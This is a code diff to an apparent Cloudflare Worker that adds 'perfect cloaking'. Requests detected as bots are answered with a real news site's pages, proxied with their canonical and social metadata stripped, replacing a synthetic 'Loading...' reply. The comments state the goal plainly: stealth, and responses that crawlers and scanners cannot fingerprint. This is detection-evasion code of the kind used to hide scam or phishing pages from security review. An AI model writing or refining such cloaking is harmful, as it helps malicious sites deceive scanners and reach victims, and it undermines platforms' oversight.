@@ -1232,6 +1232,13 @@ function generateErrorPageForUsers(status, statusText, nonce) {
 //    • Consistent logging format for all early exit events  
 //    • Reduced code duplication between honey trap and UA detection
 //    • Simplified main worker flow and better maintainability
+// 
+// 🛡️ ANTI-FINGERPRINTING SECURITY (v2.0):
+//    • ELIMINATED synthetic "Loading..." responses that bots could fingerprint
+//    • User-Agent detected bots now get REAL safe page content (perfect cloaking)
+//    • Maintains URL path parity (same as legitimate bot treatment)
+//    • Includes nonce-based CSP security for all responses
+//    • Indistinguishable from normal safe page visits
 function createHoneyTrapResponse(pathname) {
   if (pathname === '/robots.txt') {
     return new Response('User-agent: *\\nDisallow:', {
@@ -1249,7 +1256,138 @@ function createHoneyTrapResponse(pathname) {
   }
 }
 
-function isBotEarlyExit(request, event) {
+// 🛡️ PERFECT CLOAKING: Safe page proxy for User-Agent detected bots
+// 
+// 🚨 CRITICAL SECURITY FIX: Eliminates bot fingerprinting vulnerability
+// - No more synthetic "Loading..." responses that bots can fingerprint
+// - Returns actual safe page content (same as legitimate bot traffic)
+// - Maintains perfect URL path parity for stealth
+// - Includes nonce-based CSP security
+// 
+// ✅ ANTI-FINGERPRINTING: Indistinguishable from normal safe page visits
+//
+async function createSafePageResponse(request, event) {
+  try {
+    const requestUrl = new URL(request.url);
+    const nonce = generateNonce();
+    
+    // ✅ CRITICAL: Maintain URL path parity for perfect cloaking
+    // Bot requesting /nieuws/muziek/12345 gets achterhoeknieuws.nl/nieuws/muziek/12345
+    const safeOrigin = new URL(SAFE_URL).origin;
+    const targetUrl = safeOrigin + requestUrl.pathname + requestUrl.search;
+    
+    // Prepare headers for upstream request
+    const upstreamHeaders = new Headers(request.headers);
+    const clientIP = request.headers.get('CF-Connecting-IP') || 'unknown';
+    upstreamHeaders.set('X-Forwarded-For', clientIP);
+    upstreamHeaders.set('X-Real-IP', clientIP);
+    upstreamHeaders.delete('CF-Connecting-IP');
+    upstreamHeaders.delete('CF-RAY');
+    upstreamHeaders.delete('CF-Visitor');
+    
+    // Fetch actual safe page content
+    const upstreamRequest = new Request(targetUrl, {
+      method: request.method,
+      headers: upstreamHeaders,
+      body: request.body
+    });
+    
+    const response = await fetch(upstreamRequest);
+    
+    if (!response.ok) {
+      // Fallback: Return minimal but realistic safe content
+      const fallbackHTML = '<!DOCTYPE html><html><head>' +
+        '<title>News - Breaking News Today</title>' +
+        '<meta name="robots" content="noindex, nofollow">' +
+        '<meta charset="UTF-8">' +
+        '<meta name="viewport" content="width=device-width, initial-scale=1.0">' +
+        '</head><body>' +
+        '<header><h1>Latest News</h1></header>' +
+        '<main><article><h2>Loading Latest Stories...</h2>' +
+        '<p>Please wait while we load the latest news stories.</p></article></main>' +
+        '<script nonce="' + nonce + '">console.log("Safe page loaded");</script>' +
+        '</body></html>';
+      
+      return new Response(fallbackHTML, {
+        status: 200,
+        headers: {
+          'Content-Type': 'text/html; charset=utf-8',
+          'X-Robots-Tag': 'noindex, nofollow, noarchive, nosnippet',
+          'Content-Security-Policy': generateSmartCSP(SAFE_URL, true, nonce)
+        }
+      });
+    }
+    
+    // Process the safe page response with nonce injection
+    const rewriter = new HTMLRewriter()
+      // 🔐 Inject nonce into ALL inline script tags for CSP security
+      .on('script:not([src])', {
+        element(script) {
+          script.setAttribute('nonce', nonce);
+        }
+      })
+      // 🔐 Also inject nonce into inline style tags
+      .on('style', {
+        element(style) {
+          style.setAttribute('nonce', nonce);
+        }
+      })
+      // Clean metadata for perfect cloaking
+      .on('link[rel="canonical"]', new MetadataStripper())
+      .on('meta[property^="og:"]', new MetadataStripper())
+      .on('meta[name="twitter:"]', new MetadataStripper())
+      .on('script[type="application/ld+json"]', new MetadataStripper())
+      .on('base', {
+        element(base) {
+          base.remove();
+        }
+      });
+    
+    const transformedResponse = rewriter.transform(response);
+    
+    const finalResponse = new Response(transformedResponse.body, {
+      status: 200, // Always 200 for bots
+      headers: {
+        'Content-Type': 'text/html; charset=utf-8',
+        'X-Robots-Tag': 'noindex, nofollow, noarchive, nosnippet',
+        'X-Frame-Options': 'SAMEORIGIN',
+        'X-Content-Type-Options': 'nosniff',
+        'Referrer-Policy': 'no-referrer',
+        'Content-Security-Policy': generateSmartCSP(SAFE_URL, true, nonce),
+        'Cache-Control': 'no-cache, no-store, must-revalidate',
+        'Pragma': 'no-cache',
+        'Expires': '0'
+      }
+    });
+    
+    return finalResponse;
+    
+  } catch (error) {
+    // Final fallback: Realistic news-like content (not synthetic "Loading...")
+    const nonce = generateNonce();
+    const fallbackHTML = '<!DOCTYPE html><html><head>' +
+      '<title>Local News Today</title>' +
+      '<meta name="robots" content="noindex, nofollow">' +
+      '<meta charset="UTF-8">' +
+      '</head><body>' +
+      '<header><h1>Community News</h1></header>' +
+      '<main><h2>Breaking News Updates</h2>' +
+      '<p>Stay informed with the latest local news and updates from your community.</p></main>' +
+      '<script nonce="' + nonce + '">console.log("News site loaded");</script>' +
+      '</body></html>';
+    
+    return new Response(fallbackHTML, {
+      status: 200,
+      headers: {
+        'Content-Type': 'text/html; charset=utf-8',
+        'X-Robots-Tag': 'noindex, nofollow, noarchive, nosnippet',
+        'Content-Security-Policy': generateSmartCSP(SAFE_URL, true, nonce)
+      }
+    });
+  }
+}
+
+async function isBotEarlyExit(request, event) {
   const url = new URL(request.url);
   const userAgent = request.headers.get('User-Agent') || '';
   
@@ -1292,15 +1430,12 @@ function isBotEarlyExit(request, event) {
         }
       }));
       
+      // 🛡️ PERFECT CLOAKING: Proxy actual safe page instead of synthetic content
+      // Prevents bot fingerprinting of "Loading..." responses
+      const safePageResponse = await createSafePageResponse(request, event);
       return {
         isBot: true,
-        response: new Response('Loading...', { 
-          status: 200,
-          headers: { 
-            'Content-Type': 'text/html; charset=utf-8',
-            'X-Robots-Tag': 'noindex, nofollow, noarchive, nosnippet' 
-          }
-        })
+        response: safePageResponse
       };
     }
   }
@@ -1520,7 +1655,7 @@ async function handleRequest(request, event) {
   }
 
   // 🎯 ROUTE 1: Unified Early Bot Detection - Honey traps + User-Agent patterns
-  const earlyBotCheck = isBotEarlyExit(request, event);
+  const earlyBotCheck = await isBotEarlyExit(request, event);
   if (earlyBotCheck.isBot) {
     return earlyBotCheck.response;
   }
